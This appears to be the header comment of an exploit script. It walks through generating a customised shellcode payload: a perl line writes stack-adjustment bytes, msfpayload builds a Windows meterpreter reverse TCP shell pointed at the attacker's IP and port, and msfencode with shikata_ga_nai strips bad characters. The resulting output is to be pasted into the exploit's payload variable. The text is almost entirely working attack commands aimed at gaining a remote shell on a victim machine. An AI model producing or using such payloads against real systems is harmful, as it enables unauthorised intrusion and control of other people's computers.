# SKIDDIES BEWARE!
# You didn't think it'd be that easy did you?
# The payload must be customized to include your own IP address and listening port, so you'll need to generate it yourself.
# To do so, use the following steps:
# 
# 1.) Enter the following to create a hex file of the amount that needs to be subtracted from the stack pointer (3500):
# perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
#
# 2.) Next, use the following command to create a staged meterpreter shell payload:
# msfpayload windows/meterpreter/reverse_nonx_tcp LHOST=[your IP] LPORT=[your port] R > payload
#
# 3.) Then, combine the two files you just created.
# cat stackadj payload > shellcode
#
# 4.) Finally, let's eliminate the bad characters.
# cat shellcode | msfencode -b '\x00' -e x86/shikata_ga_nai -t python
#
# Enter the output as the value of the "payload" variable.
